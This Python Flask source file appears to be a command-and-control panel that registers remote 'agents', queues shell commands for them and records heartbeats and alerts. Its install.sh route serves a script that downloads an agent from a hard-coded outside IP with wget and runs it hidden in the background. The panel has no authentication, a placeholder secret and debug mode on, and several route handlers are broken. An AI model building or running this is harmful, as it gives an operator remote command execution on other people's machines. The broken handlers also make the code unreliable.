#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify, session
from flask_socketio import SocketIO, emit
import json
import sqlite3
import datetime
import os
import subprocess
import threading
import time

app = Flask(__name__)
app.secret_key = "your-secret-key-here"
socketio = SocketIO(app, cors_allowed_origins="*")

# ============================================
# DATABASE
# ============================================

def init_db():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    
    # Agents table
    c.execute('''CREATE TABLE IF NOT EXISTS agents (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        hostname TEXT,
        ip TEXT,
        os TEXT,
        kernel TEXT,
        status TEXT DEFAULT 'online',
        last_seen TEXT,
        first_seen TEXT
    )''')
    
    # Tasks table
    c.execute('''CREATE TABLE IF NOT EXISTS tasks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id INTEGER,
        command TEXT,
        status TEXT DEFAULT 'pending',
        output TEXT,
        created_at TEXT,
        executed_at TEXT
    )''')
    
    # Alerts table
    c.execute('''CREATE TABLE IF NOT EXISTS alerts (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id INTEGER,
        type TEXT,
        message TEXT,
        timestamp TEXT,
        resolved INTEGER DEFAULT 0
    )''')
    
    # Kernel logs
    c.execute('''CREATE TABLE IF NOT EXISTS kernel_logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        agent_id INTEGER,
        message TEXT,
        timestamp TEXT
    )''')
    
    conn.commit()
    conn.close()

init_db()

# ============================================
# ROUTES
# ============================================

@app.route('/')
def dashboard():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    
    total_agents = c.execute('SELECT COUNT(*) FROM agents').fetchone()[0]
    online_agents = c.execute('SELECT COUNT(*) FROM agents WHERE status="online"').fetchone()[0]
    pending_tasks = c.execute('SELECT COUNT(*) FROM tasks WHERE status="pending"').fetchone()[0]
    completed_tasks = c.execute('SELECT COUNT(*) FROM tasks WHERE status="completed"').fetchone()[0]
    
    # Recent agents
    recent = c.execute('SELECT hostname, ip, os, status, last_seen FROM agents ORDER BY last_seen DESC LIMIT 5').fetchall()
    
    conn.close()
    
    return render_template('dashboard.html',
        total_agents=total_agents,
        online_agents=online_agents,
        pending_tasks=pending_tasks,
        completed_tasks=completed_tasks,
        agents=recent
    )

@app.route('/agents')
def agents():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    agents = c.execute('SELECT * FROM agents ORDER BY last_seen DESC').fetchall()
    conn.close()
    return render_template('agents.html', agents=agents)

@app.route('/terminal/<int:agent_id>')
def terminal(agent_id):
    return render_template('terminal.html', agent_id=agent_id)

@app.route('/api/agent/<int:agent_id>/command', methods=['POST'])
def send_command():
    data = request.json
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('INSERT INTO tasks (agent_id, command, created_at) VALUES (?, ?, ?)',
        (agent_id, command, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'ok'})

@app.route('/api/agent/<int:agent_id>/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    
    c.execute('''UPDATE agents SET 
        status='online', 
        last_seen=? 
        WHERE id=?''',
        (datetime.datetime.now().isoformat(), agent_id))
    conn.commit()
    conn.close()
    
    return jsonify({'status': 'ok'})

@app.route('/api/alerts')
def get_alerts():
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    alerts = c.execute('SELECT * FROM alerts WHERE resolved=0 ORDER BY id DESC LIMIT 50').fetchall()
    conn.close()
    return jsonify([{
        'id': a[0],
        'type': a[2],
        'message': a[3],
        'timestamp': a[4]
    } for a in alerts])

# ============================================
# WEBSOCKET EVENTS
# ============================================

@socketio.on('connect')
def handle_connect():
    print('Client connected')

@socketio.on('agent_heartbeat')
def handle_heartbeat(data):
    # Update agent status via websocket
    pass

@socketio.on('agent_alert')
def handle_alert(data):
    # Broadcast alert to all clients
    emit('new_alert', data, broadcast=True)

# ============================================
# DOWNLOAD AGENT
# ============================================

@app.route('/agent/c2_agent.py')
def download_agent():
    """Download c2_agent.py"""
    agent_path = '/root/c2-panel/agent/c2_agent.py'
    if os.path.exists(agent_path):
        with open(agent_path, 'r') as f:
            content = f.read()
        return content, 200, {'Content-Type': 'text/plain'}
    else:
        # Alternative: serve from /tmp
        agent_path2 = '/tmp/c2_agent.py'
        if os.path.exists(agent_path2):
            with open(agent_path2, 'r') as f:
                content = f.read()
            return content, 200, {'Content-Type': 'text/plain'}
        return "Agent file not found", 404

@app.route('/agent/install.sh')
def download_installer():
    """Download installer script"""
    script = '''#!/bin/bash
# C2 Agent Installer
C2_SERVER="http://107.152.44.183:5000"
AGENT_DIR="/opt/c2_agent"

mkdir -p $AGENT_DIR
cd $AGENT_DIR

# Download agent
wget $C2_SERVER/agent/c2_agent.py -O c2_agent.py
chmod +x c2_agent.py

# Install dependencies
pip3 install requests

# Run agent
nohup python3 c2_agent.py > /var/log/c2_agent.log 2>&1 &

echo "[+] Agent installed and running"
echo "[+] Check: ps aux | grep c2_agent"
echo "[+] Log: tail -f /var/log/c2_agent.log"
'''
    return script, 200, {'Content-Type': 'text/plain'}

# ============================================
# MAIN
# ============================================

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
